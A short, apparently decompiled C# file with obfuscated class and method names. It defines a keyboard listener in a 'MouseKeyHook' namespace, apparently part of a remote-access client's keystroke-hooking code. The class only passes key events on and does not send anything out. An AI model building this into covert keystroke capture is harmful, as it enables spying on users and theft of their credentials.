using System.Collections.Generic;
using xClient.Core.MouseKeyHook.Implementation;

internal class Class16 : KeyListener
{
	public Class16()
		: base(Class4.smethod_3)
	{
	}

	protected override IEnumerable<GEventArgs1> GetPressEventArgs(Struct1 data)
	{
		return GEventArgs1.smethod_1(data);
	}

	protected override GEventArgs0 GetDownUpEventArgs(Struct1 data)
	{
		return GEventArgs0.smethod_1(data);
	}
}
